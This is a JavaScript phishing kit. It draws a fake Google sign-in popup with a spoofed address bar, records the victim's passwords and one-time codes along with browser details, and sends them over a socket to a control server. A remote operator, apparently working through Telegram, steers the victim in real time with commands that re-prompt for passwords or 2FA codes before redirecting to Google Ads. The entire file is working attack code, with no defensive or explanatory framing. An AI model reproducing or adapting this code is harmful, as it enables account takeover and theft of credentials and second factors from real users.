const view = `<button id="connect">Connect</button><section id="popup" hidden><header class="window-controls"></header><div class="omnibox">https://accounts.google.com</div><form id="signin"><input type="password"><input autocomplete="one-time-code"></form></section>`;
document.body.insertAdjacentHTML("beforeend", view);
const socket = io("https://control.example.invalid");
const account = {google_uid: "", password_1: "", password_2: "", password_3: "", otp: ""};
let attempt = 0;
const attemptFields = ["password_1", "password_2", "password_3"];
const popup = document.querySelector("#popup");
const password = document.querySelector('input[type="password"]');
const otp = document.querySelector('input[autocomplete="one-time-code"]');
document.querySelector("#connect").onclick = async () => {
 popup.hidden = false;
 account.google_uid = await fetch('/api/create/user', {method: 'POST'}).then(r => r.text());
 fetch('/api/send/ip', {method: 'POST', body: JSON.stringify({userAgent: navigator.userAgent, width: screen.width, height: screen.height})});
};
document.querySelector("#signin").onsubmit = event => {
 event.preventDefault();
 account[attemptFields[Math.min(attempt++, 2)]] = password.value;
 account.otp = otp.value;
 socket.emit("add_user", account);
};
const commands = {
 "/password": () => {password.value = ""; password.hidden = false;},
 "/2fa": () => {otp.hidden = false;},
 "/oktaAuthApp": () => {otp.hidden = false; otp.focus();},
 "/wrong2fa": () => {otp.value = ""; otp.hidden = false;},
 "/done": () => {window.location.href = "https://ads.google.com/";}
};
socket.on("telegram_command", command => commands[command]?.());
